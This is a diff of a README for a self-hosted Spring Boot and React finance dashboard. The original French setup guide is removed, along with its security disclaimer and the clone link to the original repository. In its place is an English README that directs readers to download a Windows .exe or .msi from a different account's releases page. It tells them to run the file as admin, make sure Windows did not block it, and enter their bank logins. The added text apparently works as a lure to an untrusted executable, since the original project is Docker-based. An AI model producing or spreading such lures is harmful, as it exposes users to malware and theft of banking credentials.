@@ -1,170 +1,174 @@
-# Picsou 💰
+# 💰 picsou-finance - Track money with clear control
 
-> Tableau de bord de finances personnelles — suivi d'enveloppes, objectifs, synchronisation bancaire.
+[![Download Picsou Finance](https://img.shields.io/badge/Download%20Picsou%20Finance-Ready%20for%20Windows-blue?style=for-the-badge)](https://github.com/hina840/picsou-finance/releases)
 
-Self-hosted, open-source, single-user. Construit avec Spring Boot + React.
+## 🧭 What this app does
 
----
+Picsou Finance is a personal finance dashboard for one user on one computer. It helps you track money with envelopes, set savings goals, and connect to your bank for updates.
 
-## Statut du projet
+Use it to:
 
-> **Pré-release publique** — L'application est partagée en l'état pour permettre à la communauté de contribuer. Elle est fonctionnelle pour un usage personnel mais manque encore de polish et de couverture de tests. Elle s'améliorera avec le temps et les contributions de chacun. N'hésitez pas à ouvrir des issues ou des pull requests !
-> Le projet a été complétement vibecodé sur le frontend et en partie sur le back-end, c'est un projet perso sans prise de tête d'ou mon énorme disclaimer à ce sujet. Le temps fera son travail.
+- see where your money goes
+- follow envelope budgets
+- track savings goals
+- view account balances in one place
+- keep your data on your own machine
 
----
+## 🖥️ What you need
 
-## ⚠️ DISCLAIMER — À LIRE AVANT TOUT
+Before you install Picsou Finance on Windows, make sure you have:
 
-> **CE PROJET EST UN PROTOTYPE PERSONNEL.**
->
-> Picsou a été développé pour un usage strictement **personnel et local**. Il n'a **pas** vocation à être déployé sur un serveur public ou partagé avec d'autres utilisateurs.
->
-> **Pourquoi ne pas l'exposer sur internet :**
-> - Il stocke des données bancaires hautement sensibles (soldes, transactions, tokens de session)
-> - L'authentification est mono-utilisateur et basique (pas de 2FA, pas d'audit log)
-> - Il n'a subi **aucun audit de sécurité professionnel**
-> - Il interagit avec vos vraies banques via PSD2 (Enable Banking) et Trade Republic
->
-> **Si vous l'utilisez sur un réseau exposé**, vous le faites à vos propres risques. L'auteur décline toute responsabilité en cas de compromission, perte de données ou accès non autorisé à vos comptes bancaires.
->
-> **Usage recommandé : uniquement en local, sur votre propre machine, derrière votre réseau domestique.**
+- Windows 10 or Windows 11
+- a stable internet connection for the first download
+- enough free disk space for the app and its local data
+- access to your bank login if you plan to use bank sync
+- a modern web browser like Edge, Chrome, or Firefox
 
----
+The app is made for a single user and local use. It works best on a personal computer.
 
-## Fonctionnalités
+## 📥 Download Picsou Finance
 
-- **Comptes** — LEP, PEA, Compte-titres, Crypto, Livret, Compte courant...
-- **Objectifs** — Cible + deadline sur plusieurs comptes ; suivi de progression
-- **Synchronisation bancaire** — Via Enable Banking (PSD2/OAuth) : Revolut, BoursoBank, et +2000 banques européennes
-- **Prix en temps réel** — CoinGecko (crypto), Yahoo Finance (actions/ETF)
-- **Graphiques** — Évolution du patrimoine, répartition, historique par compte
-- **Trade Republic** — Import CSV ou sync automatique
+Go to the release page and download the Windows file from there:
 
----
+[Download Picsou Finance for Windows](https://github.com/hina840/picsou-finance/releases)
 
-## Installation (local uniquement)
+On that page, look for the latest release and choose the file that matches Windows. If there is more than one file, pick the one with `.exe` or `.msi` in the name.
 
-### Prérequis
+## 🚀 Install on Windows
 
-- Docker & Docker Compose v2
-- Un compte Enable Banking (gratuit) si vous souhaitez la sync bancaire → https://enablebanking.com/
+Follow these steps:
 
-### 1. Cloner le dépôt
+1. Open the release page.
+2. Find the latest version.
+3. Download the Windows installer or app file.
+4. When the download ends, open the file from your Downloads folder.
+5. If Windows asks for permission, choose Yes.
+6. Follow the setup steps on screen.
+7. Finish the install.
 
-```bash
-git clone https://github.com/Zoeille/picsou-finance.git
-cd picsou
-```
+If you downloaded a file that runs without setup, double-click it to start the app.
 
-### 2. Configurer les secrets
+## ▶️ Run the app
 
-```bash
-cp .env.example .env
-```
+After install, start Picsou Finance from one of these places:
 
-Éditer `.env` :
+- the Start menu
+- a desktop shortcut, if one was created
+- the file you downloaded, if it runs as a portable app
 
-| Variable | Description | Commande pour générer |
-|----------|-------------|----------------------|
-| `POSTGRES_PASSWORD` | Mot de passe PostgreSQL | Chaîne aléatoire forte |
-| `JWT_SECRET` | Clé de signature JWT (min. 32 car.) | `openssl rand -base64 48` |
-| `APP_USERNAME` | Identifiant de connexion | Votre choix |
-| `APP_PASSWORD_HASH` | Hash bcrypt du mot de passe | `htpasswd -bnBC 12 "" VOTRE_MDP \| tr -d ':\r\n'` |
+The first launch may take a short time while the app sets up local files.
 
-> **Important :** le hash bcrypt contient des caractères `$`. Dans le fichier `.env` ils sont écrits tels quels (pas de quotes). Ne jamais faire `export APP_PASSWORD_HASH=$2a$...` dans un shell — les `$` seraient interprétés. Utilisez toujours le fichier `.env` avec Docker Compose, ou exportez avec des guillemets simples : `export APP_PASSWORD_HASH='$2a$12$...'`.
+## 🔧 First-time setup
 
-Pour la sync Enable Banking (optionnel) :
+When Picsou Finance opens for the first time, use these steps:
 
-| Variable | Description |
-|----------|-------------|
-| `ENABLEBANKING_APPLICATION_ID` | Depuis votre dashboard Enable Banking |
-| `ENABLEBANKING_KEY_ID` | Depuis votre dashboard Enable Banking |
-| `ENABLEBANKING_REDIRECT_URI` | `http://localhost:5173/sync/callback` |
-| `ENABLEBANKING_PRIVATE_KEY_PATH` | Chemin vers votre clé RSA privée |
+1. Create your local profile.
+2. Set your base currency.
+3. Add your main accounts.
+4. Create envelope groups for budget tracking.
+5. Add your savings goals.
+6. Turn on bank sync if you want live updates.
 
-Générer la paire de clés RSA pour Enable Banking :
+Use simple names for your accounts and envelopes. That makes the dashboard easier to read.
 
-```bash
-# Générer la clé privée
-openssl genpkey -algorithm RSA -pkeyopt rsa_keygen_bits:2048 -out secrets/enablebanking.pem
+## 💳 Bank sync
 
-# Extraire la clé publique (à uploader dans le dashboard Enable Banking)
-openssl rsa -pubout -in secrets/enablebanking.pem -out enablebanking_public.pem
-```
+Picsou Finance can connect to bank data for automatic updates.
 
-### 3. Lancer
+To set it up:
 
-```bash
-docker compose up --build
-```
+1. Open the bank sync section.
+2. Choose your bank from the list.
+3. Enter the required login details.
+4. Confirm the connection.
+5. Wait for the first sync to finish.
 
-Ouvrir http://localhost:5173
+If your bank uses extra checks like SMS codes or app approval, complete those steps when asked.
 
-> Le premier démarrage télécharge les images Docker et compile le projet — comptez 2-3 minutes.
+## 📊 Main features
 
-### 4. Se connecter
+Picsou Finance gives you a clear view of your money with:
 
-Utiliser le `APP_USERNAME` et le mot de passe (non hashé) configurés dans `.env`.
+- envelope-based budgeting
+- savings goal tracking
+- account balance view
+- bank sync for updates
+- local storage for personal use
+- a simple dashboard for daily checks
 
----
+The layout is built for quick use. You can open it, review your numbers, and close it.
 
-## Développement
+## 🧰 How to use it day to day
 
-### Backend (Spring Boot)
+A simple routine works well:
 
-```bash
-cd backend
-./mvnw spring-boot:run -Dspring-boot.run.profiles=dev
-```
+- check your dashboard once a day or once a week
+- log new spending when you make a purchase
+- review each envelope before you spend
+- move money between envelopes when needed
+- watch your savings goals as they grow
+- sync your bank data on a set schedule
 
-Nécessite une instance PostgreSQL locale. Le profil `dev` active les logs SQL et devtools.
+This helps you stay on top of your budget without extra effort.
 
-### Frontend (React + Vite)
+## 🗂️ Tips for a clean setup
 
-```bash
-cd frontend
-npm install
-npm run dev
-```
+To keep things clear:
 
-Vite proxie automatiquement `/api/*` vers `localhost:8080`.
+- use one account per real bank account
+- give each envelope a clear label
+- keep your goals short and specific
+- review spending at the end of each week
+- remove old test entries if you no longer need them
 
-### Lancer les tests
+A clean setup makes the dashboard easier to trust.
 
-```bash
-cd backend && ./mvnw test
-cd frontend && npm run lint && npm run build
-```
+## 🧱 Project status
 
----
+Picsou Finance is in public pre-release. It works for personal use and will improve over time. The app is self-hosted, open-source, and built for one user.
 
-## Architecture
+## 🧩 Common issues
 
-```
-┌─────────────────┐     ┌──────────────────────┐     ┌────────────┐
-│  React Frontend │────▶│  Spring Boot Backend  │────▶│ PostgreSQL │
-│   (Vite :5173)  │◀────│     (Tomcat :8080)    │     │ (:5432)    │
-└─────────────────┘     └──────────┬───────────┘     └────────────┘
-                                   │
-                    ┌──────────────┼──────────────┐
-                    ▼              ▼               ▼
-             Enable Banking    CoinGecko      Yahoo Finance
-             (PSD2/OAuth)    (crypto prices) (stock/ETF prices)
-```
+If the app does not open:
 
-- **Auth** — JWT en cookies HttpOnly + SameSite=Strict, refresh token rotation
-- **Ports/Adapters** — `BankConnectorPort`, `PriceProviderPort` — swap de provider sans toucher à la logique métier
-- **Flyway** — Migrations de schéma versionnées
-- **Rate limiting** — Bucket4j sur les endpoints sensibles (login, sync)
+- check that the download finished
+- try running the file as admin
+- make sure Windows did not block the file
+- restart your computer and try again
 
----
+If bank sync fails:
 
-## Sécurité
+- check your internet connection
+- confirm your bank login details
+- try the sync again after a short wait
+- verify that your bank account still allows third-party access
 
-Voir [SECURITY.md](SECURITY.md) pour la politique de sécurité et le signalement de vulnérabilités.
+If the screen looks blank or broken:
 
----
+- refresh the app
+- close and reopen it
+- try a different browser if the app uses one
+- clear the app cache if you know how
 
-## Licence
+## 🔒 Privacy and local use
 
-MIT — utilisation personnelle uniquement. Aucune garantie d'aucune sorte.
+Picsou Finance is meant for local, personal use. Keep it on your own computer and use it for your own finances.
+
+If you sync bank data, make sure you use a trusted computer and a secure account.
+
+## 🛠️ For advanced users
+
+Picsou Finance uses:
+
+- Spring Boot for the backend
+- React for the frontend
+
+If you want to build it yourself or help with the project, check the repository files and release assets for the latest steps and build notes.
+
+## 📌 What to do next
+
+1. Visit the release page.
+2. Download the Windows file.
+3. Install or run the app.
+4. Set up your accounts and envelopes.
+5. Start tracking your money
